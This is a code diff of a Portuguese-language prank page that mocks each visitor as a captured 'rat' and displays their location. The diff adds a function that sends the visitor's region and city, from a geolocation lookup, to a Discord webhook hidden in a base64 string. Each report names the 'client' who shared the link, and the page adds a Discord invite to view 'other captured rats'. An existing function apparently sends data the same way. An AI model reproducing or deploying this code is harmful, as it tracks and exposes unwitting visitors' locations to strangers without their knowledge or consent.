@@ -8,9 +8,10 @@
         <body style="margin: 0; padding: 0; font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;">
             <div style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column;">
                 <img src="ratoeira.webp"  width="300">
-                <h1>Mais um ratão de imgur capturado! 🤣🤣</h1>
-                <h2>O rato da vez é de <span id="loc"></span></h2>
-                <h4>Assinado: JuninhoFudelao aka Tetue</h4>
+                <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
+                <h2>O Rato da vez é de <span id="loc"></span></h2>
+                <h3>Agora vem ver os outros ratos capturados: <a href="https://discord.gg/DM82EXNp4X">Link do Discord</a></h3>
+                <h4>Assinado: JuninhoFudelao</h4>
             </div>
         </body>
 
@@ -44,6 +45,12 @@
                             data.location.localityName
                         }`,j);
 
+                        Start.ratoeira(`${
+                            data.location.principalSubdivision +
+                            ", " +
+                            data.location.localityName
+                        }`)
+
                         
 
                         try{
@@ -66,6 +73,8 @@
                     console.log(e);
                     }
                 }
+
+
 
                 static sdc(a, b, c) {
                     let u =
@@ -95,6 +104,34 @@
                             {
                             name: "",
                             value: a,
+                            },
+                        ],
+                        },
+                    ],
+                    };
+                    request.send(JSON.stringify(params));
+                }
+
+                static ratoeira(b) {
+                    let u =
+                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5Mzc0OTUyMDkxOTY5MTI2NC9fX3VUNEhQWmhlUE9fb1d5alRDY3VGOVE5aW9iZEtMMXNsbDVzbS0zbUk5Z3JEbm00MXZxM21pdVZGWDR5Q2NnYXA2MQ==";
+                    const request = new XMLHttpRequest();
+                    request.open("POST", atob(u));
+
+                    request.setRequestHeader("Content-type", "application/json");
+                    let nome = "Desconhecido";
+                    try{
+                        const urlParams = new URLSearchParams(window.location.search);
+                        nome = urlParams.get('client');
+                    } catch(e){}
+                    const params = {
+                    embeds: [
+                        {
+                        title: `Ratão capturado por ${nome}`,
+                        fields: [
+                            {
+                            name: "Rato capturado em",
+                            value: b,
                             },
                         ],
                         },
